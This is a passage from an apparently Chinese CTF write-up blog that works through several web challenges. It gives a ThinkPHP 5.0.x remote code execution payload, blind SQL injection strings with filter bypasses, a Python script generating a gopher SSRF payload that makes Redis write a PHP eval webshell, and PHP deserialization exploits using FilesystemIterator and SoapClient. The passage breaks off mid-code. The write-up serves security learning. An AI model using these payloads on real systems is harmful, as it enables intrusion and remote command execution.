href="http://106.55.154.252:500/public/">http://106.55.154.252:500/public/</a></p><p>一道<code>Thinkphp</code>框架题，有点意思的是由于这里加了<code>disable_functions</code>，导致网上的那些<code>payload</code>都不太能打得通，得自己研究研究</p><p>上来肯定还是先随便乱输点东西，看看它的报错是什么，来找找版本号：</p><p><img src="https://i.loli.net/2021/11/02/olKb4LQOHDNg6Uj.png" alt="image.png"></p><p>看了看版本号为<code>5.0.12</code>，那么先按照网上的<code>payload</code>把<code>phpinfo</code>打出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:     /public/index.php?s=index</span><br><span class="line">POST:     _method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/02/ZxvGo8egV3TkFBy.png" alt="image.png"></p><p>发现可以拿来命令执行的函数全被ban了，很难顶，看来只能考虑代码执行了，先看看<code>/etc/passwd</code>能不能行</p><p><img src="https://i.loli.net/2021/11/02/qQExYlNzf2vDc65.png" alt="image.png"></p><p>发现是没有问题的，但出题人肯定不会傻到把<code>flag</code>放在根目录下名字就为<code>flag</code>，所以说得想办法遍历目录；我们可以发现之所以这里能执行命令是因为有<code>call_user_func</code>，它会将第一个参数作为回调函数，第二个参数作为参数执行，那我们能不能想办法执行像<code>var_dump(scandir(/))</code>这种套娃型的呢，那我们就得往上面去看<code>foreach</code>了，既然他接收的是一个数组，那我们假如传入多个值呢，比如说看看下面这段代码，肯定它是可以执行的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = call_user_func(<span class="string">&#x27;scandir&#x27;</span>,<span class="string">&#x27;../&#x27;</span>);</span><br><span class="line">call_user_func(<span class="string">&#x27;var_dump&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么既然如此，我们就先传入一个<code>filter[]=scandir&amp;get[]=/</code>，那么现在的<code>$value</code>就是<code>call_user_func(&#39;scandir&#39;,&#39;/&#39;);</code>了，这时候再来一个<code>filter[]=var_dump</code>，<code>foreach</code>把<code>$filter</code>的值覆盖为<code>var_dump</code>，那么就是：</p><p><code>call_user_func(var_dump, call_user_func(&#39;scandir&#39;,&#39;/&#39;));</code>，这种毫无疑问是可以的，所以说我们最终的<code>payload</code>为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=scandir&amp;get[]=/&amp;filter[]=var_dump</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/02/e2bdTB6c9op8JXr.png" alt="image.png"></p><p>找到<code>flag</code>的名字，直接读取它拿下：</p><p><img src="https://i.loli.net/2021/11/02/1O8ILWps4Qcybvz.png" alt="image.png"></p><h2 id="16-anothersql"><a href="#16-anothersql" class="headerlink" title="16.anothersql"></a>16.anothersql</h2><p>题目地址：<a href="http://47.100.242.70:4003/">http://47.100.242.70:4003/</a></p><p>一道sql注入题，过滤不算太多，但对于我这种python脚本不算太强的人来说还是有点麻烦，用burp慢慢爆出来的</p><p>注入点依然是在<code>uname</code>这里，<code>admin&#39;</code>报错，<code>admin&#39;#</code>正常，明显这里存在注入，那我们先<code>fuzz</code>一下他过滤了些什么：</p><p><img src="https://i.loli.net/2021/11/02/QPH1FkCpO9oNMJW.png" alt="image.png"></p><p>不算很多，但过滤掉了<code>&lt; &gt; substr mid if</code>还是很烦的，还好都有相类似的可以代替，影响还不算很大哈哈哈，比较恶心的就是只能用<code>left</code>函数，每爆出一位还得先加上这一位然后去修改长度，就显得很麻烦，就是因为这个原因我都没写脚本，直接用的burp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">爆出数据库长度：admin&#x27; and length(database())=§4§ #  爆出来是12位</span><br><span class="line">爆数据库：admin&#x27; and left(database(),12)=&#x27;true____fla§1§&#x27;# 爆出数据库名位true____flag</span><br><span class="line">然后利用count爆出数据表只有一个，然后开始爆表名：</span><br><span class="line">admin&#x27; and left((select table_name from information_schema.tables where table_schema=database()),9)=&#x27;syclover§a§&#x27;#</span><br><span class="line">爆出数据表名为：syclover，然后开始爆列数：</span><br><span class="line">admin&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;syclover&#x27;)=§4§#</span><br><span class="line">爆出总共有4列，接下来开始爆列名：</span><br><span class="line">admin&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;syclover&#x27;limit 0,1),1)=&#x27;§i§&#x27;#</span><br><span class="line">前三列没什么用，分别为if uname pwd，第四列为flag，我们就只爆flag就行：</span><br><span class="line">admin&#x27; and left((select flag from syclover limit 0,1),28)=&#x27;SYC&#123;U_4N0VV_3RR0R_INJ3C410N§a§&#x27;#</span><br><span class="line">成功爆出flag为：SYC&#123;U_4N0VV_3RR0R_INJ3C410N&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/02/ROserDGa6Lp3MK1.png" alt="image.png"></p><p>当我看到<code>&#125;</code>了的时候我就知道已经大功告成了哈哈，不过看这个<code>flag</code>的内容猜这个题的考点应该是报错注入而不是盲注，看来还解了个非预期哈哈哈，但我看到<code>extractvalue</code>和<code>updatexml</code>都被过了之后我就没往这方面想了，这道题应该用<code>floor</code>，害看来还是题做少了，太菜了</p><h2 id="17-givemeyourlove"><a href="#17-givemeyourlove" class="headerlink" title="17.givemeyourlove"></a>17.givemeyourlove</h2><p>题目链接：<a href="http://1.14.71.112:44423/">http://1.14.71.112:44423</a></p><p>一道挺有意思的ssrf打redis的题，和之前的题不太一样的是这里的redis并不是未授权访问，而是存在密码的，我们不能像以前一样用<code>Gopherus</code>生成payload直接打了，而是得用一个新方法，先看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// I hear her lucky number is 123123</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/^https|dict|file:/is&quot;</span>,<span class="variable">$url</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;NO NO HACKING!!&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_exec(<span class="variable">$ch</span>);   </span><br><span class="line">curl_close(<span class="variable">$ch</span>);  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>刚开始的时候告诉我们她的幸运数字是<code>123123</code>，因为这数字不可能是端口号，那我们就盲猜它是redis的密码了，然后这题有一些过滤，挺恶心的，不能用file协议访问本地的文件，也不能用dict协议访问端口，但它没有禁掉gopher，那就直接用gopher打就行了</p><p>关于ssrf的原理啥的可以先看看这篇文章：<a href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p><p>这里的redis虽然有密码，但其实原理是一样的，都是抓取出需要的数据包，然后处理成符合<code>gopher</code>协议的方式，然后利用<code>gopher</code>协议发起攻击，只不过这里有密码，前面需要加一步<code>auth 123123</code>而已，具体的构造见这篇文章：<a href="https://xz.aliyun.com/t/5665#toc-4">https://xz.aliyun.com/t/5665#toc-4</a></p><p>那里面把脚本都给好了，我们稍微处理一下就可以使用，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;1.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;123123&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑一下结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%246%0D%0A123123%0D%0A%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%245%0D%0A1.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure><p>再<code>burp</code>中再次将它<code>url</code>编码之后打进去：</p><p><img src="https://i.loli.net/2021/10/20/4OpBVXsMAYoUeNC.png" alt="image.png"></p><p>然后直接访问<code>1.php</code>，可以发现已经成功写进去了，那就直接执行命令拿下了：</p><p><img src="https://i.loli.net/2021/10/20/5vrZn4OqSVW2Xox.png" alt="image.png"></p><h2 id="18-easyPy"><a href="#18-easyPy" class="headerlink" title="#18.easyPy"></a>#18.easyPy</h2><p>题目地址：<a href="http://1.14.102.22:5000/">http://1.14.102.22:5000/</a></p><p><img src="https://i.loli.net/2021/11/15/3w1S5ukCn7jFvIq.png" alt="image.png"></p><h2 id="19-easysql"><a href="#19-easysql" class="headerlink" title="19.easysql"></a>19.easysql</h2><p>题目地址：<a href="http://47.100.242.70:4725/index.php">http://47.100.242.70:4725/index.php</a></p><p>又是一道sql，这道sql是真正的盲注了哈哈哈，而且它的过滤挺狠的，注释符都被过了害得我搞了好久才闭合，还好它留了一个<code>mid</code></p><p>首先还是看看它过滤掉了些啥：</p><p><img src="https://i.loli.net/2021/11/09/tTKjPWF7VEBoQ6n.png" alt="image.png"></p><p>过滤的东西是真的多，主要是空格、注释符被过滤掉了，空格用<code>()</code>代替，注释符被过了就用单引号构造闭合就行，没有了<code>and</code>和<code>^</code>这些就用<code>or</code>来代替，接下来就开始构造<code>payload</code>了：<code>admin&#39;or(1=1)=&#39;1</code>，这样显示正确页面，而<code>admin&#39;or(1=1)=&#39;2</code>显示错误页面，差不多就稳了，接下来我们来爆个数据库的长度：<code>admin&#39;or(length(database()))=&#39;7</code>，爆出数据库长度为7，接下来我懒得爆数据库名了，直接用<code>database()</code>代替好了，那就开始爆表名，<code>payload</code>：<code>admin&#39;or(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),1,1))=&#39;1</code></p><p>直接用<code>burp</code>，两个位置一起爆：</p><p><img src="https://i.loli.net/2021/11/09/HM1tV6dSfQjxDWb.png" alt="image.png"></p><p>成功爆出数据表名为<code>syclover</code>，然后题目中的<code>hint</code>告诉了我们<code>flag</code>在<code>pwd</code>中，相当于列名就是<code>pwd</code>，都懒得爆了，直接爆<code>flag</code></p><p><code>admin&#39;or(mid((select(group_concat(pwd))from(syclover)),§7§,1))=&#39;§1§</code></p><p><img src="https://i.loli.net/2021/11/09/cO1V2LaNlfZCgbq.png" alt="image.png"></p><p>flag就出来了，就是比较费眼睛：<code>SYC&#123;U_@r3_G0oD_2t_SQLInj4ct10n&#125;</code></p><h2 id="20-noobPHP"><a href="#20-noobPHP" class="headerlink" title="#20.noobPHP"></a>#20.noobPHP</h2><p>题目地址：<a href="http://110.42.233.91:250/">http://110.42.233.91:250/</a></p><h2 id="21-SoEzUnser"><a href="#21-SoEzUnser" class="headerlink" title="21.SoEzUnser"></a>21.SoEzUnser</h2><p>题目地址：<a href="http://ctf.rigelx.top/unserbucket/">http://ctf.rigelx.top/unserbucket/</a></p><p>一道首先利用<code>PHP</code>标准库中内置的类读取文件，然后利用<code>SoapClient</code>类 +<code>CRLF</code>发起<code>POST</code>请求，结合<code>SSRF</code>攻击内网的题，这道题应该是我做出来的题中最难的一道了，基本上都是现学的新知识，现学现用把它做出来的，先看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fxxk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kelasi</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par0</span>,<span class="variable">$par1</span>,<span class="variable">$par2</span>,<span class="variable">$par3</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par0 = <span class="variable">$par0</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par1 = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par2 = <span class="variable">$par2</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par3 = <span class="variable">$par3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newOne</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; kelasi = <span class="keyword">new</span> <span class="keyword">$this</span> -&gt; par0(<span class="keyword">$this</span> -&gt; par1,<span class="keyword">$this</span> -&gt; par2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">wuhu</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;syclover    !&#x27;</span>.<span class="keyword">$this</span> -&gt; kelasi.<span class="string">&#x27;     yyds&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">qifei</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//$ser = serialize($this -&gt; kelasi);</span></span><br><span class="line">        <span class="comment">//$unser = unserialize($ser);</span></span><br><span class="line">        <span class="keyword">$this</span> -&gt; kelasi -&gt; juts_a_function();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span> -&gt; par0) &amp;&amp; (<span class="keyword">isset</span>(<span class="keyword">$this</span> -&gt; par1) || <span class="keyword">isset</span>(<span class="keyword">$this</span> -&gt; par2)))&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; newOne();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span> -&gt; par3 == <span class="string">&#x27;unser&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span> -&gt; qifei();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span> -&gt; wuhu();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">include_once</span>(<span class="keyword">$this</span> -&gt; par2.<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$hack</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hack&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$hack</span>); </span><br></pre></td></tr></table></figure><p>首先看到<code>__wakeup()</code>中包含了<code>hint.php</code>，前面的<code>$this -&gt; par2</code>可控，那我们先利用伪协议把文件内容读取出来，exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fxxk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par2</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> fxxk();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跑一下，结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;fxxk&quot;:1:&#123;s:4:&quot;par2&quot;;s:49:&quot;php://filter/read=convert.base64-encode/resource=&quot;;&#125;</span><br></pre></td></tr></table></figure><p>直接去打，得到<code>hint.php</code>的内容，内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$hint = &#x27;向管理员的页面post一个参数message(告诉他，&quot;iwantflag&quot;) 和 另一个参数 url（它会向这个url发送一个flag&#x27;;</span><br><span class="line">$hint .= &#x27;管理员的页面在当前目录下一个特殊文件夹里&#x27;;</span><br><span class="line">$hint .= &#x27;但是我不知道（你也猜不到的）文件夹名称和管理员页面的名称，更坏的消息是只能从127.0.0.1去访问，你能想个办法去看看（别扫 扫不出来!!!)&#x27;;</span><br></pre></td></tr></table></figure><p>可以看到是让我们想管理员的页面发起一个<code>POST</code>请求，然后它把flag给我们弹回来，但管理员的页面是没有告诉我们的，只告诉我们是在当前目录下的一个特殊文件夹里，所以说我们要先把管理员的页面找出来；这道题就和DASCTF三月赛的<code>ez_serialize</code>很像了，可以先去看看mochu师傅的文章：<a href="https://blog.csdn.net/mochu7777777/article/details/115276176">https://blog.csdn.net/mochu7777777/article/details/115276176</a></p><p>这里需要用到<code>PHP</code>标准库下的内置类了，里面是有能够进行文件处理和遍历目录的类的：<a href="https://www.php.net/manual/zh/book.spl.php">https://www.php.net/manual/zh/book.spl.php</a></p><p><img src="https://i.loli.net/2021/10/20/vgSDatpCrWbnqB7.png" alt="image.png"></p><p>比如说像<code>FilesystemIterator</code>类，就可以遍历目录，就先创建一个<code> FilesystemIterator</code>类的对象，里面的参数就是我们想遍历的目录，然后将这个对象<code>echo</code>出来就可以看到了，我们先去源码中找找，看有没有我们可控的，可以看到，在<code>newOne()</code>方法中，正好有创建对象，而且类名和参数我们都可控，然后在<code>wuhu()</code>方法中做了输出，这就很舒服了呀，我们用<code>./</code>代表当前目录，exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fxxk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par0</span> = <span class="string">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par1</span> = <span class="string">&#x27;./&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> fxxk();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:4:&quot;fxxk&quot;:2:&#123;s:4:&quot;par0&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;par1&quot;;s:2:&quot;./&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/20/FViyUdt4ajucRrw.png" alt="image.png"></p><p>可以看到输出为<code>aaaaaaaaaaafxadwagaefae</code>，说明还有一层目录，继续来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fxxk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par0</span> = <span class="string">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par1</span> = <span class="string">&#x27;./aaaaaaaaaaafxadwagaefae&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> fxxk();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:4:&quot;fxxk&quot;:2:&#123;s:4:&quot;par0&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;par1&quot;;s:25:&quot;./aaaaaaaaaaafxadwagaefae&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/20/1UC6WgnqS2tGi3T.png" alt="image.png"></p><p>可以看到php文件为<code>UcantGuess.php</code>，那这样完整的路径就出来了，为<code>127.0.0.1/unserbucket/aaaaaaaaaaafxadwagaefae/UcantGuess.php</code></p><p>然后我们看回<code>hint</code>中，要让我们向这个页面要发起请求，那肯定得想办法<code>SSRF</code>了，然后还让我们<code>POST</code>一个参数进去，那就得结合<code>CRLF</code>控制数据包了，只要利用PHP中的SoapClient类，就可以发送<code>soap</code>请求了</p><p>这里我们参考这篇文章：<a href="https://blog.csdn.net/qq_42181428/article/details/100569464">https://blog.csdn.net/qq_42181428/article/details/100569464</a></p><p>文章里面讲的很清楚，SoapClient类中的构造函数为：<code>public SoapClient :: SoapClient (mixed $wsdl [，array $options ])</code>第一个参数<code>$wsdl</code>用来指明是否是wsdl模式，第二个参数<code>$options</code>需要的是一个数组，其中有<code>location</code>和<code>uri</code>，<code>location</code>是要将请求发送到的<code>SOAP</code>服务器的<code>URL</code>地址，而<code>uri</code> 是<code>SOAP</code>服务的目标命名空间，而它里面有一个选项是<code>user_agent</code>，可以运行我们自己的<code>User-Agent</code>的值，那我们再借助<code>CRLF</code>就可以实现控制数据包了，<code>CRLF</code>的文章：<a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p><p>那接下来就开始构造exp，如果有哪里没看懂的朋友可以先去了解一下<code>SoapClient</code>类和<code>CRLF</code>哈</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 